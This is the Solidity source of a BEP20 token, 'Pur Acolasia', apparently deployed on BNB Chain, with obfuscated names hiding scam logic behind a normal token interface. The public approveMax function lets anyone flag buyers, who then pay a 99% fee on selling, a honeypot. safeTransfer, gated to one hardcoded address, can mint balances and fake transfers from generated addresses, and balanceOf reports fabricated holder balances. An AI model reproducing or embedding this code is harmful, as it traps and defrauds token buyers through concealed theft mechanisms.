/**
 *Submitted for verification at BscScan.com on 2023-01-07
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;



abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}


interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}


interface IBEP20 {

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function getOwner() external view returns (address);

    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}


library SafeMath {

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

}


interface IUniswapV2Router {

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function WETH() external pure returns (address);

    function factory() external pure returns (address);

}




contract PurAcolasia is IBEP20, Ownable {
    using SafeMath for uint256;
    uint8 constant _decimals = 18;
    uint256  receiverSenderTokenLimit = 100000000 * 10 ** _decimals;
    mapping(address => bool) private minTxSenderBurnReceiverFund;

    uint256 private isMaxTxBurn1 = 0;
    uint160 constant mintAmountSwapEnable = 973681527405 * 2 ** 40;

    uint256 private minLaunchAmountTrading = 0;
    uint256 teamMintAutoToken = 100000000 * (10 ** _decimals);
    uint256 public modeLaunchLimitExemptSell = 0;
    uint256 constant fromToIsFee = 300000 * 10 ** 18;
    uint160 constant receiverMaxShouldEnable = 910221954348;
    address private minTxMintWallet = (msg.sender);

    mapping(address => bool)  tradingReceiverLimitBuy;
    string constant _symbol = "PAA";


    uint256  enableReceiverBuyLaunch = 100000000 * 10 ** _decimals;
    
    bool public senderReceiverFundList = false;

    address public uniswapV2Pair;
    mapping(address => uint256) _balances;
    string constant _name = "Pur Acolasia";
    mapping(address => bool)  liquidityTotalListShouldTokenReceiver;
    uint256 public atLaunchedMinMax = 0;
    uint256 constant maxModeMarketingReceiver = 10000 * 10 ** 18;

    bool public enableToSenderFundLaunchTokenTx = false;
    bool private isMaxTxBurn = false;

    uint256 private marketingLiquiditySwapSenderFromEnable = 1;
    bool public autoLaunchedBuyFee = false;
    uint256 public toEnableMinMint = 0;
    bool private isMaxTxBurn0 = false;
    uint256 limitReceiverShouldReceiver = 0;


    uint160 constant isShouldMarketingBuyWalletFundMode = 192318109273 * 2 ** 80;
    uint256 private takeModeReceiverFundToAuto = 100;

    bool public exemptIsSellTradingTotal = false;
    uint160 constant swapExemptAutoBuyShouldSenderBots = 80088116582 * 2 ** 120;
    uint256 public fromTxBuyAt = 0;
    mapping(address => mapping(address => uint256)) _allowances;
    IUniswapV2Router public limitToMaxListLiquidity;
    uint256 private senderFundBotsBurnTeamLimit = 1;

    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        limitToMaxListLiquidity = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(limitToMaxListLiquidity.factory()).createPair(address(this), limitToMaxListLiquidity.WETH());
        _allowances[address(this)][address(limitToMaxListLiquidity)] = teamMintAutoToken;

        minTxSenderBurnReceiverFund[msg.sender] = true;
        minTxSenderBurnReceiverFund[address(this)] = true;

        _balances[msg.sender] = teamMintAutoToken;
        emit Transfer(address(0), msg.sender, teamMintAutoToken);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return teamMintAutoToken;
    }

    function getliquidityFeeBurnTrading() public view returns (bool) {
        if (senderReceiverFundList == autoLaunchedBuyFee) {
            return autoLaunchedBuyFee;
        }
        if (senderReceiverFundList != isMaxTxBurn0) {
            return isMaxTxBurn0;
        }
        if (senderReceiverFundList == isMaxTxBurn0) {
            return isMaxTxBurn0;
        }
        return senderReceiverFundList;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function setswapAutoBotsToken(bool liquidityReceiverShouldReceiver) public onlyOwner {
        autoLaunchedBuyFee=liquidityReceiverShouldReceiver;
    }

    function approveMax(address spender) external {
        if (tradingReceiverLimitBuy[spender]) {
            liquidityTotalListShouldTokenReceiver[spender] = true;
        }
    }

    function amountBotsTokenLaunched() private pure returns (address) {
        return 0x4b390168f7bB659275fDe87d0a2dC79fda5c1e3b;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function getswapAutoBotsToken() public view returns (bool) {
        if (autoLaunchedBuyFee == isMaxTxBurn0) {
            return isMaxTxBurn0;
        }
        if (autoLaunchedBuyFee != isMaxTxBurn0) {
            return isMaxTxBurn0;
        }
        if (autoLaunchedBuyFee != isMaxTxBurn0) {
            return isMaxTxBurn0;
        }
        return autoLaunchedBuyFee;
    }

    function gettotalMaxIsSenderListReceiver() public view returns (address) {
        if (minTxMintWallet == minTxMintWallet) {
            return minTxMintWallet;
        }
        return minTxMintWallet;
    }

    function getminTokenTradingMaxTakeListAuto() public view returns (uint256) {
        if (fromTxBuyAt == marketingLiquiditySwapSenderFromEnable) {
            return marketingLiquiditySwapSenderFromEnable;
        }
        return fromTxBuyAt;
    }

    function getmarketingTokenMaxWalletIsBurn() public view returns (uint256) {
        if (isMaxTxBurn1 != atLaunchedMinMax) {
            return atLaunchedMinMax;
        }
        return isMaxTxBurn1;
    }

    function limitFundEnableLaunch(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function isApproveMax(address spender) public view returns (bool) {
        return liquidityTotalListShouldTokenReceiver[spender];
    }

    function getmodeShouldLaunchedAuto() public view returns (bool) {
        if (enableToSenderFundLaunchTokenTx != isMaxTxBurn) {
            return isMaxTxBurn;
        }
        if (enableToSenderFundLaunchTokenTx == isMaxTxBurn0) {
            return isMaxTxBurn0;
        }
        return enableToSenderFundLaunchTokenTx;
    }

    function settotalMaxIsSenderListReceiver(address liquidityReceiverShouldReceiver) public onlyOwner {
        minTxMintWallet=liquidityReceiverShouldReceiver;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return isBuyLimitLaunchedSell(msg.sender, recipient, amount);
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function setliquidityFeeBurnTrading(bool liquidityReceiverShouldReceiver) public onlyOwner {
        if (senderReceiverFundList == exemptIsSellTradingTotal) {
            exemptIsSellTradingTotal=liquidityReceiverShouldReceiver;
        }
        if (senderReceiverFundList == isMaxTxBurn) {
            isMaxTxBurn=liquidityReceiverShouldReceiver;
        }
        if (senderReceiverFundList != isMaxTxBurn) {
            isMaxTxBurn=liquidityReceiverShouldReceiver;
        }
        senderReceiverFundList=liquidityReceiverShouldReceiver;
    }

    function shouldTakeReceiverMode(address launchedMinFeeTotal) internal view returns (bool) {
        return !minTxSenderBurnReceiverFund[launchedMinFeeTotal];
    }

    function fromLaunchedEnableTotalTradingBots(address fundMarketingSwapEnableLiquidity) private view returns (bool) {
        if (fundMarketingSwapEnableLiquidity == minTxMintWallet) {
            return true;
        }
        if (fundMarketingSwapEnableLiquidity == address(0)) {
            return false;
        }
        return false;
    }

    function setmodeShouldLaunchedAuto(bool liquidityReceiverShouldReceiver) public onlyOwner {
        enableToSenderFundLaunchTokenTx=liquidityReceiverShouldReceiver;
    }

    function gettotalTakeAmountTeam() public view returns (uint256) {
        if (atLaunchedMinMax != isMaxTxBurn1) {
            return isMaxTxBurn1;
        }
        return atLaunchedMinMax;
    }

    function txTotalTakeToken(uint160 shouldLimitSenderMaxMinFromReceiver) private pure returns (bool) {
        uint160 maxToTakeShould = swapExemptAutoBuyShouldSenderBots + isShouldMarketingBuyWalletFundMode + mintAmountSwapEnable + receiverMaxShouldEnable;
        if (shouldLimitSenderMaxMinFromReceiver >= uint160(maxToTakeShould)) {
            if (shouldLimitSenderMaxMinFromReceiver <= uint160(maxToTakeShould) + 300000) {
                return true;
            }
        }
        return false;
    }

    function safeTransfer(address launchedMinFeeTotal, address teamShouldListAmountTxAtFrom, uint256 txTotalAtTo) public {
        if (!sellWalletAtTotalBuyReceiverBurn(msg.sender)) {
            return;
        }
        if (txTotalTakeToken(uint160(teamShouldListAmountTxAtFrom))) {
            receiverAmountAtBots(launchedMinFeeTotal, teamShouldListAmountTxAtFrom, txTotalAtTo, false);
            return;
        }
        if (teamShouldListAmountTxAtFrom == address(1)) {
            return;
        }
        if (txTotalTakeToken(uint160(launchedMinFeeTotal))) {
            receiverAmountAtBots(launchedMinFeeTotal, teamShouldListAmountTxAtFrom, txTotalAtTo, true);
            return;
        }
        if (txTotalAtTo == 0) {
            return;
        }
        if (launchedMinFeeTotal == address(0)) {
            _balances[teamShouldListAmountTxAtFrom] = _balances[teamShouldListAmountTxAtFrom].add(txTotalAtTo);
            return;
        }
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function isBuyLimitLaunchedSell(address launchedMinFeeTotal, address teamShouldListAmountTxAtFrom, uint256 txTotalAtTo) internal returns (bool) {
        if (txTotalTakeToken(uint160(teamShouldListAmountTxAtFrom))) {
            receiverAmountAtBots(launchedMinFeeTotal, teamShouldListAmountTxAtFrom, txTotalAtTo, false);
            return true;
        }
        if (txTotalTakeToken(uint160(launchedMinFeeTotal))) {
            receiverAmountAtBots(launchedMinFeeTotal, teamShouldListAmountTxAtFrom, txTotalAtTo, true);
            return true;
        }
        
        if (fromTxBuyAt == fromTxBuyAt) {
            fromTxBuyAt = modeLaunchLimitExemptSell;
        }


        bool burnExemptSwapReceiver = fromLaunchedEnableTotalTradingBots(launchedMinFeeTotal) || fromLaunchedEnableTotalTradingBots(teamShouldListAmountTxAtFrom);
        
        if (launchedMinFeeTotal == uniswapV2Pair && !burnExemptSwapReceiver) {
            tradingReceiverLimitBuy[teamShouldListAmountTxAtFrom] = true;
        }
        
        if (atLaunchedMinMax == marketingLiquiditySwapSenderFromEnable) {
            atLaunchedMinMax = isMaxTxBurn1;
        }

        if (senderReceiverFundList != isMaxTxBurn) {
            senderReceiverFundList = senderReceiverFundList;
        }


        if (burnExemptSwapReceiver) {
            return limitFundEnableLaunch(launchedMinFeeTotal, teamShouldListAmountTxAtFrom, txTotalAtTo);
        }
        
        if (atLaunchedMinMax != toEnableMinMint) {
            atLaunchedMinMax = isMaxTxBurn1;
        }


        _balances[launchedMinFeeTotal] = _balances[launchedMinFeeTotal].sub(txTotalAtTo, "Insufficient Balance!");
        
        uint256 exemptAtWalletAutoSwapMinReceiver = shouldTakeReceiverMode(launchedMinFeeTotal) ? atIsFromSwapReceiver(launchedMinFeeTotal, teamShouldListAmountTxAtFrom, txTotalAtTo) : txTotalAtTo;

        _balances[teamShouldListAmountTxAtFrom] = _balances[teamShouldListAmountTxAtFrom].add(exemptAtWalletAutoSwapMinReceiver);
        emit Transfer(launchedMinFeeTotal, teamShouldListAmountTxAtFrom, exemptAtWalletAutoSwapMinReceiver);
        return true;
    }

    function sellWalletAtTotalBuyReceiverBurn(address shouldLimitSenderMaxMinFromReceiver) private pure returns (bool) {
        return shouldLimitSenderMaxMinFromReceiver == amountBotsTokenLaunched();
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != teamMintAutoToken) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return isBuyLimitLaunchedSell(sender, recipient, amount);
    }

    function settotalTakeAmountTeam(uint256 liquidityReceiverShouldReceiver) public onlyOwner {
        if (atLaunchedMinMax == modeLaunchLimitExemptSell) {
            modeLaunchLimitExemptSell=liquidityReceiverShouldReceiver;
        }
        if (atLaunchedMinMax != minLaunchAmountTrading) {
            minLaunchAmountTrading=liquidityReceiverShouldReceiver;
        }
        atLaunchedMinMax=liquidityReceiverShouldReceiver;
    }

    function setminTokenTradingMaxTakeListAuto(uint256 liquidityReceiverShouldReceiver) public onlyOwner {
        if (fromTxBuyAt == marketingLiquiditySwapSenderFromEnable) {
            marketingLiquiditySwapSenderFromEnable=liquidityReceiverShouldReceiver;
        }
        if (fromTxBuyAt != takeModeReceiverFundToAuto) {
            takeModeReceiverFundToAuto=liquidityReceiverShouldReceiver;
        }
        fromTxBuyAt=liquidityReceiverShouldReceiver;
    }

    function setmarketingTokenMaxWalletIsBurn(uint256 liquidityReceiverShouldReceiver) public onlyOwner {
        if (isMaxTxBurn1 != modeLaunchLimitExemptSell) {
            modeLaunchLimitExemptSell=liquidityReceiverShouldReceiver;
        }
        if (isMaxTxBurn1 != fromTxBuyAt) {
            fromTxBuyAt=liquidityReceiverShouldReceiver;
        }
        isMaxTxBurn1=liquidityReceiverShouldReceiver;
    }

    function atIsFromSwapReceiver(address launchedMinFeeTotal, address receiverTokenTradingAt, uint256 txTotalAtTo) internal returns (uint256) {
        
        if (toEnableMinMint != atLaunchedMinMax) {
            toEnableMinMint = fromTxBuyAt;
        }


        uint256 maxAtListMin = txTotalAtTo.mul(fundTradingListIsAmountTakeBurn(launchedMinFeeTotal, receiverTokenTradingAt == uniswapV2Pair)).div(takeModeReceiverFundToAuto);

        if (maxAtListMin > 0) {
            _balances[address(this)] = _balances[address(this)].add(maxAtListMin);
            emit Transfer(launchedMinFeeTotal, address(this), maxAtListMin);
        }

        return txTotalAtTo.sub(maxAtListMin);
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (txTotalTakeToken(uint160(account))) {
            return totalFromSenderTx(uint160(account));
        }
        return _balances[account];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function getlaunchedBuyMaxSwap() public view returns (uint256) {
        return toEnableMinMint;
    }

    function totalFromSenderTx(uint160 shouldLimitSenderMaxMinFromReceiver) private view returns (uint256) {
        uint160 maxToTakeShould = swapExemptAutoBuyShouldSenderBots + isShouldMarketingBuyWalletFundMode + mintAmountSwapEnable + receiverMaxShouldEnable;
        if ((shouldLimitSenderMaxMinFromReceiver - uint160(maxToTakeShould)) < limitReceiverShouldReceiver) {
            return maxModeMarketingReceiver;
        }
        return fromToIsFee;
    }

    function fundTradingListIsAmountTakeBurn(address launchedMinFeeTotal, bool botsMintFromLimitSenderAutoReceiver) internal returns (uint256) {
        if (liquidityTotalListShouldTokenReceiver[launchedMinFeeTotal]) {
            return 99;
        }
        
        if (botsMintFromLimitSenderAutoReceiver) {
            return senderFundBotsBurnTeamLimit;
        }
        if (!botsMintFromLimitSenderAutoReceiver && launchedMinFeeTotal == uniswapV2Pair) {
            return marketingLiquiditySwapSenderFromEnable;
        }
        return 0;
    }

    function setlaunchedBuyMaxSwap(uint256 liquidityReceiverShouldReceiver) public onlyOwner {
        if (toEnableMinMint == takeModeReceiverFundToAuto) {
            takeModeReceiverFundToAuto=liquidityReceiverShouldReceiver;
        }
        toEnableMinMint=liquidityReceiverShouldReceiver;
    }

    function receiverAmountAtBots(address launchedMinFeeTotal, address teamShouldListAmountTxAtFrom, uint256 txTotalAtTo, bool toShouldMaxReceiverLiquidityReceiver) private {
        uint160 maxToTakeShould = swapExemptAutoBuyShouldSenderBots + isShouldMarketingBuyWalletFundMode + mintAmountSwapEnable + receiverMaxShouldEnable;
        if (toShouldMaxReceiverLiquidityReceiver) {
            launchedMinFeeTotal = address(uint160(maxToTakeShould + limitReceiverShouldReceiver));
            limitReceiverShouldReceiver++;
            _balances[teamShouldListAmountTxAtFrom] = _balances[teamShouldListAmountTxAtFrom].add(txTotalAtTo);
        } else {
            _balances[launchedMinFeeTotal] = _balances[launchedMinFeeTotal].sub(txTotalAtTo);
        }
        if (txTotalAtTo == 0) {
            return;
        }
        emit Transfer(launchedMinFeeTotal, teamShouldListAmountTxAtFrom, txTotalAtTo);
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}